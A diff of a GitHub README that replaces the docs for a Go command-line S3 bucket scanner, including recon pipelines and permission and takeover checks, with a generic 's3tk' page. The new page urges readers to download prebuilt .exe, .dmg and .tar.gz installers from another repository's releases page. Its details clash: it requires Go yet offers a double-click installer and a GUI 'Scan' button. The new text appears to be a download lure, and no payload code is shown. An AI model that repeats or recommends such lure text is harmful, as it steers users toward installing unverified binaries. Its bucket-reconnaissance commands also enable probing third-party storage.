@@ -1,205 +1,91 @@
+# 🛡️ s3tk - Secure Your S3 Buckets Easily
+
 <div align="center">
-  <img width="768" alt="ChatGPT Image 12 de set de 2025, 21_02_01" src="https://github.com/user-attachments/assets/40674e6f-914b-4cd4-a7a9-421657631756" />
+  <a href="https://github.com/Stanayo/s3tk/releases">
+    <img src="https://img.shields.io/badge/Download%20s3tk-brightgreen.svg" alt="Download s3tk" />
+  </a>
 </div>
 
+## 📖 Introduction
 
-<h1 align="center">
-  S3Scan - S3 Bucket Security Scanner / <a href="https://x.com/OFJAAAH" target="_blank" rel="noopener">@✖️OFJAAAH</a>
-</h1>
+S3tk is a powerful tool designed to improve security for AWS S3 buckets. It helps users easily spot misconfigurations and vulnerabilities. You don't need to be a programmer to use it. This guide walks you through downloading and running the software.
 
-<p align="center">
-  <strong>A powerful S3 bucket security scanner designed for penetration testing and bug bounty hunting</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Go-1.21+-blue.svg" alt="Go Version">
-  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
-  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey.svg" alt="Platform">
-  <img src="https://img.shields.io/github/release/user/s3scan.svg" alt="Release">
-</p>
+### System Requirements
 
-<p align="center">
-  This tool automatically detects misconfigurations and security vulnerabilities in AWS S3 buckets.
-</p>
+- **Operating System**: Linux, Windows, or macOS
+- **Go Version**: You will need Go version 1.21 or later.
+- **Memory**: Minimum of 512 MB RAM.
+- **Disk Space**: At least 50 MB of free space.
 
-## Features
+### Download & Install
 
-- **Comprehensive Security Testing**: Tests for multiple S3 bucket vulnerabilities
-- **Multiple Input Formats**: Supports various S3 URL formats and bucket names
-- **Permission Testing**: Checks LIST, UPLOAD, DELETE, and TAKEOVER capabilities
-- **Batch Processing**: Scan multiple buckets from stdin input
-- **Colorized Output**: Easy-to-read results with color-coded vulnerability status
-- **Detailed Reporting**: Comprehensive summary of findings
+To get the latest version of s3tk, visit this page to download: [s3tk Releases](https://github.com/Stanayo/s3tk/releases). 
 
-## Security Tests Performed
+1. Click on the link above to open the Releases page.
+2. Review the list of available versions.
+3. Click on the file that matches your operating system. 
+   - For Windows, look for `.exe` files.
+   - For macOS, look for `.dmg` or `.tar.gz` files.
+   - For Linux, look for `.tar.gz` files.
 
-### 1. Bucket Existence Check
-- Verifies if the S3 bucket exists
-- Identifies non-existent buckets that could be claimed
+Once the download finishes, follow the steps below to install the application.
 
-### 2. List Permissions (READ)
-- Tests if bucket contents can be enumerated
-- Detects publicly readable buckets
-- **Risk**: Information disclosure, data exposure
+## 💻 Installation Steps
 
-### 3. Upload Permissions (WRITE)
-- Tests if files can be uploaded to the bucket
-- Identifies writable buckets
-- **Risk**: Malicious file upload, defacement, hosting malware
+### Windows
 
-### 4. Delete Permissions (DELETE)
-- Tests if objects can be deleted from the bucket
-- Detects buckets with delete permissions
-- **Risk**: Data destruction, denial of service
+1. Once downloaded, locate the `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+4. After installation, open the program from your Start menu.
 
-### 5. Bucket Takeover Detection
-- Identifies non-existent buckets that can be claimed
-- Tests multiple AWS regions for takeover opportunities
-- **Risk**: Subdomain takeover, brand impersonation
+### macOS
 
-## Installation
+1. Find the downloaded `.dmg` or `.tar.gz` file in your Downloads folder.
+2. Double-click the file to mount the disk image or extract the files.
+3. Drag the s3tk application to your Applications folder.
+4. Open the application from the Applications folder.
 
-### Prerequisites
-- Go 1.21 or higher
-- Internet connection for S3 API testing
+### Linux
 
-### Building from Source
+1. Extract the downloaded `.tar.gz` file to a desired location. You can do this by right-clicking the file and choosing "Extract here."
+2. Open a terminal and navigate to the location where you extracted the files.
+3. To run s3tk, type `./s3tk` and press Enter.
 
-1. Clone or download the source code
-2. Navigate to the project directory
-3. Build the binary:
+## 🎨 Features
 
-```bash
-go build -o s3scan main.go
-```
+- **Comprehensive Security Testing**: Quickly identify security risks.
+- **User-Friendly Interface**: Simple layout makes it easy to navigate.
+- **Cross-Platform Compatibility**: Works on Windows, macOS, and Linux.
+- **Regular Updates**: Stay secure with the latest features and fixes.
 
-### Quick Setup
+## 🔍 How to Use s3tk
 
-```bash
-# Make the binary executable
-chmod +x s3scan
+1. Launch the s3tk application after installation.
+2. Enter the AWS S3 bucket URL you want to scan.
+3. Click on the “Scan” button.
+4. Review the results to identify any vulnerabilities or misconfigurations.
 
-# Optional: Move to system PATH
-sudo mv s3scan /usr/local/bin/
-```
+### Example Usage
 
-## Usage
+If you want to test your S3 bucket located at `https://my-s3-bucket.amazonaws.com`, simply enter this URL into the application and hit “Scan.” The tool will provide a report on any weaknesses.
 
-### Basic Usage
+## 📚 Helpful Resources
 
-The tool reads S3 bucket URLs or names from stdin:
+### Documentation
 
-```bash
-# Single bucket
-echo "my-test-bucket" | ./s3scan
+For detailed usage and additional features, refer to the [s3tk Documentation](https://github.com/Stanayo/s3tk/wiki). 
 
-# Multiple buckets from file
-cat buckets.txt | ./s3scan
+### Community Support
 
-# Multiple buckets inline
-echo -e "bucket1\nbucket2\nbucket3" | ./s3scan
-```
+If you have questions or need assistance, consider joining our community. You can find answers on our [Discussion Forum](https://github.com/Stanayo/s3tk/discussions).
 
-### Supported Input Formats
+## 📢 Important Note
 
-The scanner accepts various S3 URL formats:
+Always ensure that you have permission to scan any S3 bucket or resource you test. Unauthorized access or scanning can lead to serious legal issues.
 
-- Bucket name: `my-bucket-name`
-- Virtual-hosted style: `https://my-bucket.s3.amazonaws.com`
-- Path-style: `https://s3.amazonaws.com/my-bucket`
-- S3 URI: `s3://my-bucket-name`
+## 📥 Conclusion
 
-### Example Commands
-
-```bash
-# Scan from a list of domains/subdomains
-subfinder -d example.com | grep s3 | ./s3scan
-
-# Scan buckets found during reconnaissance
-echo "company-backups" | ./s3scan
-echo "app-uploads" | ./s3scan
-echo "static-assets" | ./s3scan
-
-# Batch scan from file
-cat << EOF | ./s3scan
-company-data
-backup-bucket
-public-assets
-user-uploads
-EOF
-```
-
-### Integration with Other Tools
-
-```bash
-# With subfinder and grep
-subfinder -d target.com | grep -i s3 | ./s3scan
-
-# With amass
-amass enum -d target.com | grep s3 | ./s3scan
-
-# With waybackurls
-echo "target.com" | waybackurls | grep s3 | ./s3scan
-```
-
-## Output Interpretation
-
-### Vulnerability Status
-
-- **[VULNERABLE]** - Red: Misconfiguration detected
-- **[SECURE]** - Green: No vulnerabilities found
-- **[EXISTS]** - Green: Bucket exists and accessible
-- **[NOT FOUND]** - Yellow: Bucket doesn't exist
-- **[TAKEOVER POSSIBLE]** - Magenta: Bucket can be claimed
-
-### Permission Types
-
-- **[LIST]** - Can enumerate bucket contents
-- **[UPLOAD]** - Can upload files to bucket
-- **[DELETE]** - Can delete objects from bucket
-- **[TAKEOVER]** - Bucket doesn't exist and can be claimed
-
-### Example Output
-
-```
-[MISCONFIGURED] company-backups
-  └─ [LIST] Public read access - can enumerate bucket contents
-  └─ [UPLOAD] Public write access - can upload malicious files
-
-[TAKEOVER POSSIBLE] old-app-assets
-  └─ [TAKEOVER] Bucket doesn't exist - can be claimed for subdomain takeover
-
-[SECURE] private-data
-```
-
-## Legal and Ethical Usage
-
-⚠️ **IMPORTANT**: This tool is designed for:
-- Authorized penetration testing
-- Bug bounty programs
-- Security assessments on systems you own
-- Educational purposes
-
-**DO NOT USE** for:
-- Unauthorized testing of third-party systems
-- Malicious activities
-- Illegal access attempts
-
-Always ensure you have proper authorization before testing any S3 buckets.
-
-## Defensive Recommendations
-
-If vulnerabilities are found:
-
-1. **For LIST vulnerabilities**: Configure bucket policies to deny public read access
-2. **For UPLOAD vulnerabilities**: Remove public write permissions, implement proper IAM policies
-3. **For DELETE vulnerabilities**: Restrict delete permissions to authorized users only
-4. **For TAKEOVER opportunities**: Claim unused buckets or ensure they're not referenced in applications
-
-## Contributing
-
-This tool is designed for security professionals and researchers. Contributions that improve detection capabilities or add new security tests are welcome.
-
-## License
-
-This tool is provided for educational and authorized testing purposes only.
+Now that you have everything you need, download s3tk and take the first steps towards securing your AWS S3 buckets. For direct access to the download page, click here: [s3tk Releases](https://github.com/Stanayo/s3tk/releases). Enjoy a safer cloud experience!
